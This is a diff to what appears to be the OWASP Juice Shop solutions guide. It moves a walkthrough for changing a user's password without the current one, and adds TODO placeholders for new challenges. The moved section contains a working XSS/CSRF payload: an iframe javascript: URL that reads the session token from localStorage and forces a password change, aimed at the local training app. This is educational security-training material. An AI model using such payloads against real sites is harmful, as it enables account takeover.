@@ -251,6 +251,10 @@ in order to exploit and solve them:
 2. Submit your feedback with one of the following words in the comment:
    `z85`, `base85`, `base64`, `md5` or `hashid`.
 
+### Perform an XSS attack on a legacy page within the application
+
+:wrench: **TODO**
+
 ## Medium Challenges (  :star::star::star:  )
 
 ###  Get registered as admin user
@@ -697,67 +701,9 @@ more attention & a good portion of shrewdness.
 4. Once you hit the "Christmas Super-Surprise-Box (2014 Edition)" click
    _Checkout_ for instant success!
 
-### Change Bender's password into slurmCl4ssic without using SQL Injection or Forgot Password
+### Identify an unsafe product that was removed from the shop and inform the shop which ingredients are dangerous
 
-1. Log in as anyone.
-2. Inspecting the backend HTTP calls of the _Password Change_ form
-   reveals that these happen via `HTTP GET` and submits current and new
-   password in clear text.
-3. Probe the responses of `/rest/user/change-password` on various
-   inputs:
-   * <http://localhost:3000/rest/user/change-password?current=A> yields
-     a `401` error saying `Password cannot be empty.`
-   * <http://localhost:3000/rest/user/change-password?current=A&new=B>
-     yields a `401` error saying `New and repeated password do not
-     match.`
-   * <http://localhost:3000/rest/user/change-password?current=A&new=B&repeat=C>
-     also says `New and repeated password do not match.`
-   * <http://localhost:3000/rest/user/change-password?current=A&new=B&repeat=B>
-     says `Current password is not correct.`
-   * <http://localhost:3000/rest/user/change-password?new=B&repeat=B>
-     yields a `200` success returning the updated user as JSON!
-4. Now
-   [Log in with Bender's user account](#log-in-with-benders-user-account)
-   using SQL Injection.
-5. Craft a GET request with Bender's `Authorization Bearer` header to
-   <http://localhost:3000/rest/user/change-password?new=slurmCl4ssic&repeat=slurmCl4ssic>
-   to solve the challenge.
-
-   ![CSRF-like request via PostMan](img/csrf_postman.png)
-
-#### Bonus Round: Cross Site Request Forgery
-
-If you want to craft an actual CSRF attack against
-`/rest/user/change-password` you will have to invest a bit extra work,
-because a simple attack like _Search_ for `<img
-src="http://localhost:3000/rest/user/change-password?new=slurmCl4ssic&repeat=slurmCl4ssic">`
-will not work. Making someone click on the corresponding attack link
-<http://localhost:3000/#/search?q=%3Cimg%20src%3D%22http:%2F%2Flocalhost:3000%2Frest%2Fuser%2Fchange-password%3Fnew%3DslurmCl4ssic%26repeat%3DslurmCl4ssic%22%3E>
-will return a `500` error when loading the image URL with a message
-clearly stating that your attack ran against a security-wall: `Error:
-Blocked illegal activity`
-
-To make this exploit work, some more sophisticated attack URL is
-required:
-
-<http://localhost:3000/#/search?q=%3Ciframe%20src%3D%22javascript%3Axmlhttp%20%3D%20new%20XMLHttpRequest%28%29%3B%20xmlhttp.open%28%27GET%27%2C%20%27http%3A%2F%2Flocalhost%3A3000%2Frest%2Fuser%2Fchange-password%3Fnew%3DslurmCl4ssic%26amp%3Brepeat%3DslurmCl4ssic%27%29%3B%20xmlhttp.setRequestHeader%28%27Authorization%27%2C%60Bearer%3D%24%7BlocalStorage.getItem%28%27token%27%29%7D%60%29%3B%20xmlhttp.send%28%29%3B%22%3E>
-
-Pretty-printed this attack is easier to understand:
-
-```html
-<iframe src="javascript:xmlhttp = new XMLHttpRequest();
-   xmlhttp.open('GET', 'http://localhost:3000/rest/user/change-password?new=slurmCl4ssic&amp;repeat=slurmCl4ssic');
-   xmlhttp.setRequestHeader('Authorization',`Bearer=${localStorage.getItem('token')}`);
-   xmlhttp.send();">
-</iframe>
-```
-
-Anyone who is logged in to the Juice Shop while clicking on this link
-will get their password set to the same one we forced onto Bender!
-
-:clap: Kudos to Joe Butler, who originally described this kind of CSRF
-payload in his blog post
-[Hacking(and automating!) the OWASP Juice Shop](https://incognitjoe.github.io/hacking-the-juice-shop.html).
+:wrench: **TODO**
 
 ### Find the hidden easter egg
 
@@ -1178,6 +1124,72 @@ explains the problem and gives an exploit example:
                 }).join("")
             }(13, 144, 87, 152, 139, 144, 83, 138) + 10..toString(36).toLowerCase()
 ```
+
+### Change Bender's password into slurmCl4ssic without using SQL Injection or Forgot Password
+
+1. Log in as anyone.
+2. Inspecting the backend HTTP calls of the _Password Change_ form
+   reveals that these happen via `HTTP GET` and submits current and new
+   password in clear text.
+3. Probe the responses of `/rest/user/change-password` on various
+   inputs:
+   * <http://localhost:3000/rest/user/change-password?current=A> yields
+     a `401` error saying `Password cannot be empty.`
+   * <http://localhost:3000/rest/user/change-password?current=A&new=B>
+     yields a `401` error saying `New and repeated password do not
+     match.`
+   * <http://localhost:3000/rest/user/change-password?current=A&new=B&repeat=C>
+     also says `New and repeated password do not match.`
+   * <http://localhost:3000/rest/user/change-password?current=A&new=B&repeat=B>
+     says `Current password is not correct.`
+   * <http://localhost:3000/rest/user/change-password?new=B&repeat=B>
+     yields a `200` success returning the updated user as JSON!
+4. Now
+   [Log in with Bender's user account](#log-in-with-benders-user-account)
+   using SQL Injection.
+5. Craft a GET request with Bender's `Authorization Bearer` header to
+   <http://localhost:3000/rest/user/change-password?new=slurmCl4ssic&repeat=slurmCl4ssic>
+   to solve the challenge.
+
+   ![CSRF-like request via PostMan](img/csrf_postman.png)
+
+#### Bonus Round: Cross Site Request Forgery
+
+If you want to craft an actual CSRF attack against
+`/rest/user/change-password` you will have to invest a bit extra work,
+because a simple attack like _Search_ for `<img
+src="http://localhost:3000/rest/user/change-password?new=slurmCl4ssic&repeat=slurmCl4ssic">`
+will not work. Making someone click on the corresponding attack link
+<http://localhost:3000/#/search?q=%3Cimg%20src%3D%22http:%2F%2Flocalhost:3000%2Frest%2Fuser%2Fchange-password%3Fnew%3DslurmCl4ssic%26repeat%3DslurmCl4ssic%22%3E>
+will return a `500` error when loading the image URL with a message
+clearly stating that your attack ran against a security-wall: `Error:
+Blocked illegal activity`
+
+To make this exploit work, some more sophisticated attack URL is
+required:
+
+<http://localhost:3000/#/search?q=%3Ciframe%20src%3D%22javascript%3Axmlhttp%20%3D%20new%20XMLHttpRequest%28%29%3B%20xmlhttp.open%28%27GET%27%2C%20%27http%3A%2F%2Flocalhost%3A3000%2Frest%2Fuser%2Fchange-password%3Fnew%3DslurmCl4ssic%26amp%3Brepeat%3DslurmCl4ssic%27%29%3B%20xmlhttp.setRequestHeader%28%27Authorization%27%2C%60Bearer%3D%24%7BlocalStorage.getItem%28%27token%27%29%7D%60%29%3B%20xmlhttp.send%28%29%3B%22%3E>
+
+Pretty-printed this attack is easier to understand:
+
+```html
+<iframe src="javascript:xmlhttp = new XMLHttpRequest();
+   xmlhttp.open('GET', 'http://localhost:3000/rest/user/change-password?new=slurmCl4ssic&amp;repeat=slurmCl4ssic');
+   xmlhttp.setRequestHeader('Authorization',`Bearer=${localStorage.getItem('token')}`);
+   xmlhttp.send();">
+</iframe>
+```
+
+Anyone who is logged in to the Juice Shop while clicking on this link
+will get their password set to the same one we forced onto Bender!
+
+:clap: Kudos to Joe Butler, who originally described this kind of CSRF
+payload in his blog post
+[Hacking(and automating!) the OWASP Juice Shop](https://incognitjoe.github.io/hacking-the-juice-shop.html).
+
+### Dumpster dive the Internet for a leaked password and log in to the original user account it belongs to
+
+:wrench: **TODO**
 
 ###  Perform an unwanted information disclosure by accessing data cross-domain
 
